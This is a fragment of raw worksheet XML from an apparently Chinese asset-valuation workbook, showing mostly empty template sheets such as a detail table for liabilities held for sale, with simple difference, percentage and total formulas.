      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="380" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="588" t="n"/>
      <c r="I8" s="555" t="n"/>
      <c r="J8" s="555" t="n"/>
      <c r="K8" s="555">
        <f>J8-I8</f>
        <v/>
      </c>
      <c r="L8" s="555">
        <f>IF(I8=0,"",K8/I8*100)</f>
        <v/>
      </c>
      <c r="M8" s="383" t="n"/>
    </row>
    <row r="9" ht="16.5" customHeight="1" s="415">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="380" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="588" t="n"/>
      <c r="I9" s="555" t="n"/>
      <c r="J9" s="555" t="n"/>
      <c r="K9" s="555">
        <f>J9-I9</f>
        <v/>
      </c>
      <c r="L9" s="555">
        <f>IF(I9=0,"",K9/I9*100)</f>
        <v/>
      </c>
      <c r="M9" s="383" t="n"/>
    </row>
    <row r="10" ht="16.5" customHeight="1" s="415">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="380" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="588" t="n"/>
      <c r="I10" s="555" t="n"/>
      <c r="J10" s="555" t="n"/>
      <c r="K10" s="555">
        <f>J10-I10</f>
        <v/>
      </c>
      <c r="L10" s="555">
        <f>IF(I10=0,"",K10/I10*100)</f>
        <v/>
      </c>
      <c r="M10" s="383" t="n"/>
    </row>
    <row r="11" ht="16.5" customHeight="1" s="415">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="380" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="588" t="n"/>
      <c r="I11" s="555" t="n"/>
      <c r="J11" s="555" t="n"/>
      <c r="K11" s="555">
        <f>J11-I11</f>
        <v/>
      </c>
      <c r="L11" s="555">
        <f>IF(I11=0,"",K11/I11*100)</f>
        <v/>
      </c>
      <c r="M11" s="383" t="n"/>
    </row>
    <row r="12" ht="16.5" customHeight="1" s="415">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="380" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="588" t="n"/>
      <c r="I12" s="555" t="n"/>
      <c r="J12" s="555" t="n"/>
      <c r="K12" s="555">
        <f>J12-I12</f>
        <v/>
      </c>
      <c r="L12" s="555">
        <f>IF(I12=0,"",K12/I12*100)</f>
        <v/>
      </c>
      <c r="M12" s="383" t="n"/>
    </row>
    <row r="13" ht="16.5" customHeight="1" s="415">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="380" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="588" t="n"/>
      <c r="I13" s="555" t="n"/>
      <c r="J13" s="555" t="n"/>
      <c r="K13" s="555">
        <f>J13-I13</f>
        <v/>
      </c>
      <c r="L13" s="555">
        <f>IF(I13=0,"",K13/I13*100)</f>
        <v/>
      </c>
      <c r="M13" s="383" t="n"/>
    </row>
    <row r="14" ht="16.5" customHeight="1" s="415">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="380" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="588" t="n"/>
      <c r="I14" s="555" t="n"/>
      <c r="J14" s="555" t="n"/>
      <c r="K14" s="555">
        <f>J14-I14</f>
        <v/>
      </c>
      <c r="L14" s="555">
        <f>IF(I14=0,"",K14/I14*100)</f>
        <v/>
      </c>
      <c r="M14" s="383" t="n"/>
    </row>
    <row r="15" ht="16.5" customHeight="1" s="415">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="380" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="588" t="n"/>
      <c r="I15" s="555" t="n"/>
      <c r="J15" s="555" t="n"/>
      <c r="K15" s="555">
        <f>J15-I15</f>
        <v/>
      </c>
      <c r="L15" s="555">
        <f>IF(I15=0,"",K15/I15*100)</f>
        <v/>
      </c>
      <c r="M15" s="383" t="n"/>
    </row>
    <row r="16" ht="16.5" customHeight="1" s="415">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="380" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="588" t="n"/>
      <c r="I16" s="555" t="n"/>
      <c r="J16" s="555" t="n"/>
      <c r="K16" s="555">
        <f>J16-I16</f>
        <v/>
      </c>
      <c r="L16" s="555">
        <f>IF(I16=0,"",K16/I16*100)</f>
        <v/>
      </c>
      <c r="M16" s="383" t="n"/>
    </row>
    <row r="17" ht="16.5" customHeight="1" s="415">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="380" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="588" t="n"/>
      <c r="I17" s="555" t="n"/>
      <c r="J17" s="555" t="n"/>
      <c r="K17" s="555">
        <f>J17-I17</f>
        <v/>
      </c>
      <c r="L17" s="555">
        <f>IF(I17=0,"",K17/I17*100)</f>
        <v/>
      </c>
      <c r="M17" s="383" t="n"/>
    </row>
    <row r="18" ht="16.5" customHeight="1" s="415">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="380" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="588" t="n"/>
      <c r="I18" s="555" t="n"/>
      <c r="J18" s="555" t="n"/>
      <c r="K18" s="555">
        <f>J18-I18</f>
        <v/>
      </c>
      <c r="L18" s="555">
        <f>IF(I18=0,"",K18/I18*100)</f>
        <v/>
      </c>
      <c r="M18" s="383" t="n"/>
    </row>
    <row r="19" ht="16.5" customHeight="1" s="415">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="380" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="588" t="n"/>
      <c r="I19" s="555" t="n"/>
      <c r="J19" s="555" t="n"/>
      <c r="K19" s="555">
        <f>J19-I19</f>
        <v/>
      </c>
      <c r="L19" s="555">
        <f>IF(I19=0,"",K19/I19*100)</f>
        <v/>
      </c>
      <c r="M19" s="383" t="n"/>
    </row>
    <row r="20" ht="16.5" customHeight="1" s="415">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="380" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="588" t="n"/>
      <c r="I20" s="555" t="n"/>
      <c r="J20" s="555" t="n"/>
      <c r="K20" s="555">
        <f>J20-I20</f>
        <v/>
      </c>
      <c r="L20" s="555">
        <f>IF(I20=0,"",K20/I20*100)</f>
        <v/>
      </c>
      <c r="M20" s="383" t="n"/>
    </row>
    <row r="21" ht="16.5" customHeight="1" s="415">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="380" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="588" t="n"/>
      <c r="I21" s="555" t="n"/>
      <c r="J21" s="555" t="n"/>
      <c r="K21" s="555">
        <f>J21-I21</f>
        <v/>
      </c>
      <c r="L21" s="555">
        <f>IF(I21=0,"",K21/I21*100)</f>
        <v/>
      </c>
      <c r="M21" s="383" t="n"/>
    </row>
    <row r="22" ht="16.5" customHeight="1" s="415">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="380" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="588" t="n"/>
      <c r="I22" s="555" t="n"/>
      <c r="J22" s="555" t="n"/>
      <c r="K22" s="555">
        <f>J22-I22</f>
        <v/>
      </c>
      <c r="L22" s="555">
        <f>IF(I22=0,"",K22/I22*100)</f>
        <v/>
      </c>
      <c r="M22" s="383" t="n"/>
    </row>
    <row r="23" ht="16.5" customHeight="1" s="415">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="380" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="588" t="n"/>
      <c r="I23" s="555" t="n"/>
      <c r="J23" s="555" t="n"/>
      <c r="K23" s="555">
        <f>J23-I23</f>
        <v/>
      </c>
      <c r="L23" s="555">
        <f>IF(I23=0,"",K23/I23*100)</f>
        <v/>
      </c>
      <c r="M23" s="383" t="n"/>
    </row>
    <row r="24" ht="16.5" customHeight="1" s="415">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="380" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="588" t="n"/>
      <c r="I24" s="555" t="n"/>
      <c r="J24" s="555" t="n"/>
      <c r="K24" s="555">
        <f>J24-I24</f>
        <v/>
      </c>
      <c r="L24" s="555">
        <f>IF(I24=0,"",K24/I24*100)</f>
        <v/>
      </c>
      <c r="M24" s="383" t="n"/>
    </row>
    <row r="25" ht="16.5" customHeight="1" s="415">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="380" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="588" t="n"/>
      <c r="I25" s="555" t="n"/>
      <c r="J25" s="555" t="n"/>
      <c r="K25" s="555">
        <f>J25-I25</f>
        <v/>
      </c>
      <c r="L25" s="555">
        <f>IF(I25=0,"",K25/I25*100)</f>
        <v/>
      </c>
      <c r="M25" s="383" t="n"/>
    </row>
    <row r="26" ht="16.5" customHeight="1" s="415">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="380" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="588" t="n"/>
      <c r="I26" s="555" t="n"/>
      <c r="J26" s="555" t="n"/>
      <c r="K26" s="555">
        <f>J26-I26</f>
        <v/>
      </c>
      <c r="L26" s="555">
        <f>IF(I26=0,"",K26/I26*100)</f>
        <v/>
      </c>
      <c r="M26" s="383" t="n"/>
    </row>
    <row r="27" ht="16.5" customHeight="1" s="415">
      <c r="A27" s="116" t="n"/>
      <c r="B27" s="380" t="n"/>
      <c r="C27" s="381" t="n"/>
      <c r="D27" s="587" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="380" t="n"/>
      <c r="G27" s="555" t="n"/>
      <c r="H27" s="588" t="n"/>
      <c r="I27" s="555" t="n"/>
      <c r="J27" s="555" t="n"/>
      <c r="K27" s="555">
        <f>J27-I27</f>
        <v/>
      </c>
      <c r="L27" s="555">
        <f>IF(I27=0,"",K27/I27*100)</f>
        <v/>
      </c>
      <c r="M27" s="383" t="n"/>
    </row>
    <row r="28" ht="16.5" customHeight="1" s="415">
      <c r="A28" s="116" t="n"/>
      <c r="B28" s="380" t="n"/>
      <c r="C28" s="381" t="n"/>
      <c r="D28" s="587" t="n"/>
      <c r="E28" s="380" t="n"/>
      <c r="F28" s="380" t="n"/>
      <c r="G28" s="555" t="n"/>
      <c r="H28" s="588" t="n"/>
      <c r="I28" s="555" t="n"/>
      <c r="J28" s="555" t="n"/>
      <c r="K28" s="555">
        <f>J28-I28</f>
        <v/>
      </c>
      <c r="L28" s="555">
        <f>IF(I28=0,"",K28/I28*100)</f>
        <v/>
      </c>
      <c r="M28" s="383" t="n"/>
    </row>
    <row r="29" ht="16.5" customHeight="1" s="415">
      <c r="A29" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B29" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C29" s="567" t="n"/>
      <c r="D29" s="115" t="n"/>
      <c r="E29" s="380" t="n"/>
      <c r="F29" s="380" t="n"/>
      <c r="G29" s="555">
        <f>ROUND(SUM(G6:G28),2)</f>
        <v/>
      </c>
      <c r="H29" s="380" t="n"/>
      <c r="I29" s="555">
        <f>ROUND(SUM(I6:I28),2)</f>
        <v/>
      </c>
      <c r="J29" s="555">
        <f>ROUND(SUM(J6:J28),2)</f>
        <v/>
      </c>
      <c r="K29" s="555">
        <f>J29-I29</f>
        <v/>
      </c>
      <c r="L29" s="555">
        <f>IF(I29=0,"",K29/I29*100)</f>
        <v/>
      </c>
      <c r="M29" s="383" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B1:M1"/>
    <mergeCell ref="B2:M2"/>
    <mergeCell ref="B29:C29"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:M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1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 codeName="Sheet93">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:J29"/>
  <sheetViews>
    <sheetView view="pageBreakPreview" zoomScaleNormal="100" workbookViewId="0">
      <selection activeCell="A6" sqref="A6:A26"/>
    </sheetView>
  </sheetViews>
  <sheetFormatPr baseColWidth="8" defaultColWidth="9" defaultRowHeight="15.75" customHeight="1"/>
  <cols>
    <col width="9" customWidth="1" style="410" min="1" max="1"/>
    <col width="15.1666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="33" customWidth="1" style="410" min="3" max="3"/>
    <col width="11.6666666666667" customWidth="1" style="410" min="4" max="4"/>
    <col width="15.5" customWidth="1" style="410" min="5" max="5"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="7" max="8"/>
    <col outlineLevel="1" width="9.16666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="18.1666666666667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持有待售负债评估明细表</t>
        </is>
      </c>
    </row>
    <row r="2" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A2" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B2" s="547">
        <f>'2-分类汇总'!B2</f>
        <v/>
      </c>
    </row>
    <row r="3" ht="18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402" t="inlineStr">
        <is>
          <t>表5-11</t>
        </is>
      </c>
    </row>
    <row r="4" ht="18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402">
        <f>'2-分类汇总'!H4</f>
        <v/>
      </c>
    </row>
    <row r="5" ht="18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185" t="inlineStr">
        <is>
          <t>结算内容</t>
        </is>
      </c>
      <c r="F5" s="307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8" customFormat="1" customHeight="1" s="116">
      <c r="A6" s="116" t="n"/>
      <c r="B6" s="380" t="n"/>
      <c r="C6" s="381" t="n"/>
      <c r="D6" s="587" t="n"/>
      <c r="E6" s="185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8" customFormat="1" customHeight="1" s="116">
      <c r="A7" s="116" t="n"/>
      <c r="B7" s="380" t="n"/>
      <c r="C7" s="381" t="n"/>
      <c r="D7" s="587" t="n"/>
      <c r="E7" s="380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8" customFormat="1" customHeight="1" s="116">
      <c r="A8" s="116" t="n"/>
      <c r="B8" s="380" t="n"/>
      <c r="C8" s="381" t="n"/>
      <c r="D8" s="587" t="n"/>
      <c r="E8" s="380" t="n"/>
      <c r="F8" s="555" t="n"/>
      <c r="G8" s="555" t="n"/>
      <c r="H8" s="555">
        <f>G8-F8</f>
        <v/>
      </c>
      <c r="I8" s="555">
        <f>IF(F8=0,"",H8/F8*100)</f>
        <v/>
      </c>
      <c r="J8" s="383" t="n"/>
    </row>
    <row r="9" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A9" s="116" t="n"/>
      <c r="B9" s="380" t="n"/>
      <c r="C9" s="381" t="n"/>
      <c r="D9" s="587" t="n"/>
      <c r="E9" s="380" t="n"/>
      <c r="F9" s="555" t="n"/>
      <c r="G9" s="555" t="n"/>
      <c r="H9" s="555">
        <f>G9-F9</f>
        <v/>
      </c>
      <c r="I9" s="555">
        <f>IF(F9=0,"",H9/F9*100)</f>
        <v/>
      </c>
      <c r="J9" s="383" t="n"/>
    </row>
    <row r="10" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A10" s="116" t="n"/>
      <c r="B10" s="380" t="n"/>
      <c r="C10" s="381" t="n"/>
      <c r="D10" s="587" t="n"/>
      <c r="E10" s="380" t="n"/>
      <c r="F10" s="555" t="n"/>
      <c r="G10" s="555" t="n"/>
      <c r="H10" s="555">
        <f>G10-F10</f>
        <v/>
      </c>
      <c r="I10" s="555">
        <f>IF(F10=0,"",H10/F10*100)</f>
        <v/>
      </c>
      <c r="J10" s="383" t="n"/>
    </row>
    <row r="11" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A11" s="116" t="n"/>
      <c r="B11" s="380" t="n"/>
      <c r="C11" s="381" t="n"/>
      <c r="D11" s="587" t="n"/>
      <c r="E11" s="380" t="n"/>
      <c r="F11" s="555" t="n"/>
      <c r="G11" s="555" t="n"/>
      <c r="H11" s="555">
        <f>G11-F11</f>
        <v/>
      </c>
      <c r="I11" s="555">
        <f>IF(F11=0,"",H11/F11*100)</f>
        <v/>
      </c>
      <c r="J11" s="383" t="n"/>
    </row>
    <row r="12" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A12" s="116" t="n"/>
      <c r="B12" s="380" t="n"/>
      <c r="C12" s="381" t="n"/>
      <c r="D12" s="587" t="n"/>
      <c r="E12" s="380" t="n"/>
      <c r="F12" s="555" t="n"/>
      <c r="G12" s="555" t="n"/>
      <c r="H12" s="555">
        <f>G12-F12</f>
        <v/>
      </c>
      <c r="I12" s="555">
        <f>IF(F12=0,"",H12/F12*100)</f>
        <v/>
      </c>
      <c r="J12" s="383" t="n"/>
    </row>
    <row r="13" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A13" s="116" t="n"/>
      <c r="B13" s="380" t="n"/>
      <c r="C13" s="381" t="n"/>
      <c r="D13" s="587" t="n"/>
      <c r="E13" s="380" t="n"/>
      <c r="F13" s="555" t="n"/>
      <c r="G13" s="555" t="n"/>
      <c r="H13" s="555">
        <f>G13-F13</f>
        <v/>
      </c>
      <c r="I13" s="555">
        <f>IF(F13=0,"",H13/F13*100)</f>
        <v/>
      </c>
      <c r="J13" s="383" t="n"/>
    </row>
    <row r="14" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A14" s="116" t="n"/>
      <c r="B14" s="380" t="n"/>
      <c r="C14" s="381" t="n"/>
      <c r="D14" s="587" t="n"/>
      <c r="E14" s="380" t="n"/>
      <c r="F14" s="555" t="n"/>
      <c r="G14" s="555" t="n"/>
      <c r="H14" s="555">
        <f>G14-F14</f>
        <v/>
      </c>
      <c r="I14" s="555">
        <f>IF(F14=0,"",H14/F14*100)</f>
        <v/>
      </c>
      <c r="J14" s="383" t="n"/>
    </row>
    <row r="15" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A15" s="116" t="n"/>
      <c r="B15" s="380" t="n"/>
      <c r="C15" s="381" t="n"/>
      <c r="D15" s="587" t="n"/>
      <c r="E15" s="380" t="n"/>
      <c r="F15" s="555" t="n"/>
      <c r="G15" s="555" t="n"/>
      <c r="H15" s="555">
        <f>G15-F15</f>
        <v/>
      </c>
      <c r="I15" s="555">
        <f>IF(F15=0,"",H15/F15*100)</f>
        <v/>
      </c>
      <c r="J15" s="383" t="n"/>
    </row>
    <row r="16" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A16" s="116" t="n"/>
      <c r="B16" s="380" t="n"/>
      <c r="C16" s="381" t="n"/>
      <c r="D16" s="587" t="n"/>
      <c r="E16" s="380" t="n"/>
      <c r="F16" s="555" t="n"/>
      <c r="G16" s="555" t="n"/>
      <c r="H16" s="555">
        <f>G16-F16</f>
        <v/>
      </c>
      <c r="I16" s="555">
        <f>IF(F16=0,"",H16/F16*100)</f>
        <v/>
      </c>
      <c r="J16" s="383" t="n"/>
    </row>
    <row r="17" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A17" s="116" t="n"/>
      <c r="B17" s="380" t="n"/>
      <c r="C17" s="381" t="n"/>
      <c r="D17" s="587" t="n"/>
      <c r="E17" s="380" t="n"/>
      <c r="F17" s="555" t="n"/>
      <c r="G17" s="555" t="n"/>
      <c r="H17" s="555">
        <f>G17-F17</f>
        <v/>
      </c>
      <c r="I17" s="555">
        <f>IF(F17=0,"",H17/F17*100)</f>
        <v/>
      </c>
      <c r="J17" s="383" t="n"/>
    </row>
    <row r="18" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A18" s="116" t="n"/>
      <c r="B18" s="380" t="n"/>
      <c r="C18" s="381" t="n"/>
      <c r="D18" s="587" t="n"/>
      <c r="E18" s="380" t="n"/>
      <c r="F18" s="555" t="n"/>
      <c r="G18" s="555" t="n"/>
      <c r="H18" s="555">
        <f>G18-F18</f>
        <v/>
      </c>
      <c r="I18" s="555">
        <f>IF(F18=0,"",H18/F18*100)</f>
        <v/>
      </c>
      <c r="J18" s="383" t="n"/>
    </row>
    <row r="19" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A19" s="116" t="n"/>
      <c r="B19" s="380" t="n"/>
      <c r="C19" s="381" t="n"/>
      <c r="D19" s="587" t="n"/>
      <c r="E19" s="380" t="n"/>
      <c r="F19" s="555" t="n"/>
      <c r="G19" s="555" t="n"/>
      <c r="H19" s="555">
        <f>G19-F19</f>
        <v/>
      </c>
      <c r="I19" s="555">
        <f>IF(F19=0,"",H19/F19*100)</f>
        <v/>
      </c>
      <c r="J19" s="383" t="n"/>
    </row>
    <row r="20" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A20" s="116" t="n"/>
      <c r="B20" s="380" t="n"/>
      <c r="C20" s="381" t="n"/>
      <c r="D20" s="587" t="n"/>
      <c r="E20" s="380" t="n"/>
      <c r="F20" s="555" t="n"/>
      <c r="G20" s="555" t="n"/>
      <c r="H20" s="555">
        <f>G20-F20</f>
        <v/>
      </c>
      <c r="I20" s="555">
        <f>IF(F20=0,"",H20/F20*100)</f>
        <v/>
      </c>
      <c r="J20" s="383" t="n"/>
    </row>
    <row r="21" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A21" s="116" t="n"/>
      <c r="B21" s="380" t="n"/>
      <c r="C21" s="381" t="n"/>
      <c r="D21" s="587" t="n"/>
      <c r="E21" s="380" t="n"/>
      <c r="F21" s="555" t="n"/>
      <c r="G21" s="555" t="n"/>
      <c r="H21" s="555">
        <f>G21-F21</f>
        <v/>
      </c>
      <c r="I21" s="555">
        <f>IF(F21=0,"",H21/F21*100)</f>
        <v/>
      </c>
      <c r="J21" s="383" t="n"/>
    </row>
    <row r="22" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A22" s="116" t="n"/>
      <c r="B22" s="380" t="n"/>
      <c r="C22" s="381" t="n"/>
      <c r="D22" s="587" t="n"/>
      <c r="E22" s="380" t="n"/>
      <c r="F22" s="555" t="n"/>
      <c r="G22" s="555" t="n"/>
      <c r="H22" s="555">
        <f>G22-F22</f>
        <v/>
      </c>
      <c r="I22" s="555">
        <f>IF(F22=0,"",H22/F22*100)</f>
        <v/>
      </c>
      <c r="J22" s="383" t="n"/>
    </row>
    <row r="23" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A23" s="116" t="n"/>
      <c r="B23" s="380" t="n"/>
      <c r="C23" s="381" t="n"/>
      <c r="D23" s="587" t="n"/>
      <c r="E23" s="380" t="n"/>
      <c r="F23" s="555" t="n"/>
      <c r="G23" s="555" t="n"/>
      <c r="H23" s="555">
        <f>G23-F23</f>
        <v/>
      </c>
      <c r="I23" s="555">
        <f>IF(F23=0,"",H23/F23*100)</f>
        <v/>
      </c>
      <c r="J23" s="383" t="n"/>
    </row>
    <row r="24" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A24" s="116" t="n"/>
      <c r="B24" s="380" t="n"/>
      <c r="C24" s="381" t="n"/>
      <c r="D24" s="587" t="n"/>
      <c r="E24" s="380" t="n"/>
      <c r="F24" s="555" t="n"/>
      <c r="G24" s="555" t="n"/>
      <c r="H24" s="555">
        <f>G24-F24</f>
        <v/>
      </c>
      <c r="I24" s="555">
        <f>IF(F24=0,"",H24/F24*100)</f>
        <v/>
      </c>
      <c r="J24" s="383" t="n"/>
    </row>
    <row r="25" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A25" s="116" t="n"/>
      <c r="B25" s="380" t="n"/>
      <c r="C25" s="381" t="n"/>
      <c r="D25" s="587" t="n"/>
      <c r="E25" s="380" t="n"/>
      <c r="F25" s="555" t="n"/>
      <c r="G25" s="555" t="n"/>
      <c r="H25" s="555">
        <f>G25-F25</f>
        <v/>
      </c>
      <c r="I25" s="555">
        <f>IF(F25=0,"",H25/F25*100)</f>
        <v/>
      </c>
      <c r="J25" s="383" t="n"/>
    </row>
    <row r="26" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A26" s="116" t="n"/>
      <c r="B26" s="380" t="n"/>
      <c r="C26" s="381" t="n"/>
      <c r="D26" s="587" t="n"/>
      <c r="E26" s="380" t="n"/>
      <c r="F26" s="555" t="n"/>
      <c r="G26" s="555" t="n"/>
      <c r="H26" s="555">
        <f>G26-F26</f>
        <v/>
      </c>
      <c r="I26" s="555">
        <f>IF(F26=0,"",H26/F26*100)</f>
        <v/>
      </c>
      <c r="J26" s="383" t="n"/>
    </row>
    <row r="27" ht="18" customFormat="1" customHeight="1" s="116">
      <c r="A27" s="116" t="inlineStr">
        <is>
          <t>合计1</t>
        </is>
      </c>
      <c r="B27" s="380" t="inlineStr">
        <is>
          <t>合            计</t>
        </is>
      </c>
      <c r="C27" s="567" t="n"/>
      <c r="D27" s="115" t="n"/>
      <c r="E27" s="380" t="n"/>
      <c r="F27" s="555">
        <f>ROUND(SUM(F6:F26),2)</f>
        <v/>
      </c>
      <c r="G27" s="555">
        <f>ROUND(SUM(G6:G26),2)</f>
        <v/>
      </c>
      <c r="H27" s="555">
        <f>G27-F27</f>
        <v/>
      </c>
      <c r="I27" s="555">
        <f>IF(F27=0,"",H27/F27*100)</f>
        <v/>
      </c>
      <c r="J27" s="383" t="n"/>
    </row>
    <row r="28" s="415">
      <c r="A28" s="116" t="n"/>
    </row>
    <row r="29" s="415">
      <c r="A29" s="116" t="n"/>
    </row>
  </sheetData>
  <mergeCells count="4">
    <mergeCell ref="B27:C27"/>
    <mergeCell ref="B1:J1"/>
    <mergeCell ref="B2:J2"/>
    <mergeCell ref="B4:E4"/>
  </mergeCells>
  <conditionalFormatting sqref="B5:J27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4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 codeName="Sheet94">
    <outlinePr summaryBelow="1" summaryRight="1"/>
    <pageSetUpPr fitToPage="1"/>
  </sheetPr>
  <dimension ref="A1:N28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9" customWidth="1" style="410" min="1" max="1"/>
    <col width="7.66666666666667" customWidth="1" style="410" min="2" max="2"/>
    <col width="25.6666666666667" customWidth="1" style="410" min="3" max="3"/>
    <col width="15.3333333333333" customWidth="1" style="410" min="4" max="4"/>
    <col width="14.8333333333333" customWidth="1" style="410" min="5" max="5"/>
    <col width="12.3333333333333" customWidth="1" style="410" min="6" max="6"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="7" max="7"/>
    <col outlineLevel="1" width="13" customWidth="1" style="410" min="8" max="8"/>
    <col outlineLevel="1" width="10.6666666666667" customWidth="1" style="410" min="9" max="9"/>
    <col width="15.6666666666667" customWidth="1" style="410" min="10" max="10"/>
    <col outlineLevel="1" width="15.6666666666667" customWidth="1" style="410" min="11" max="12"/>
    <col outlineLevel="1" width="8.66666666666667" customWidth="1" style="410" min="13" max="13"/>
    <col width="14.6666666666667" customWidth="1" style="410" min="14" max="14"/>
    <col width="9" customWidth="1" style="410" min="15" max="16384"/>
  </cols>
  <sheetData>
    <row r="1" ht="30" customFormat="1" customHeight="1" s="368">
      <c r="A1" s="116" t="inlineStr">
        <is>
          <t>表头区域</t>
        </is>
      </c>
      <c r="B1" s="371" t="inlineStr">
        <is>
